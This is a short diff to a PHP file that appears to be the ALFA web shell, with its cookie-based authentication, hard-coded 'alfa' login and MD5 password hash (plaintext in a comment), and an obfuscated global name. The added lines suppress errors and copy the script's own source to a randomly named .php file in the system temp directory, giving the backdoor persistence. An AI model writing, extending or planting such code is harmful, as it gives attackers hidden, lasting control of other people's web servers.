@@ -49,6 +49,14 @@ if (!isset($_COOKIE['alfa_auth']) && isset($_GET[$PARAM_NAME]) && $_GET[$PARAM_N
 error_reporting(0);
 ini_set('display_errors', 0);
 
+$temp_dir = sys_get_temp_dir();
+$current_content = file_get_contents(__FILE__);
+$random_name = substr(md5(time() . mt_rand()), 0, 25) . '.php';
+$backup_path = $temp_dir . '/' . $random_name;
+if (!file_exists($backup_path)) {
+    file_put_contents($backup_path, $current_content);
+}
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
     'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
